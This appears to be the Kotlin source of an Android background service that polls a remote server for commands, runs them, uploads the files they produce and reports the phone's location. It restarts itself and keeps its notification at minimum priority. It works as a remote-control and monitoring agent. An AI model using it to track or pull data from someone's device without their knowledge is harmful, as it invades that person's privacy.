package org.hullas.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class HullasService : Service() {
    private val tag = "HullasService"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        ServiceLifecycleOwner.start()
        startForeground(NOTIF_ID, buildNotification())
        startPolling()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        pollJob?.cancel()
        scope.cancel()
        ServiceLifecycleOwner.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope.launch {
            val api = ApiClient(this@HullasService)
            val executor = CommandExecutor(this@HullasService)
            var beat = 0
            while (isActive) {
                try {
                    if (beat % 6 == 0) api.heartbeat()
                    beat++
                    val cmd = api.poll()
                    if (cmd != null) {
                        Log.i(tag, "Buyruq: ${cmd.cmd}")
                        handleCommand(api, executor, cmd)
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Poll xato", e)
                }
                delay(10_000)
            }
        }
    }

    private suspend fun handleCommand(
        api: ApiClient,
        executor: CommandExecutor,
        cmd: Command,
    ) {
        val result = executor.execute(cmd)
        result.onSuccess { file ->
            if (cmd.cmd == "location") {
                api.sendResult(cmd.id, "failed", error = "Not implemented via file")
                return
            }
            if (file != null) {
                api.sendResult(cmd.id, "done", file = file)
                file.delete()
            } else {
                api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
            }
        }.onFailure { e ->
            if (e is LocationException && e.coords != null) {
                api.sendResult(
                    cmd.id, "done",
                    lat = e.coords.first, lon = e.coords.second,
                )
            } else {
                api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
            }
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "hullas_agent"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId, getString(R.string.service_channel),
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                description = getString(R.string.service_running)
                setShowBadge(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, SetupActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(getString(R.string.service_running))
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pi)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    companion object {
        const val NOTIF_ID = 42

        fun start(ctx: android.content.Context) {
            val i = Intent(ctx, HullasService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        }
    }
}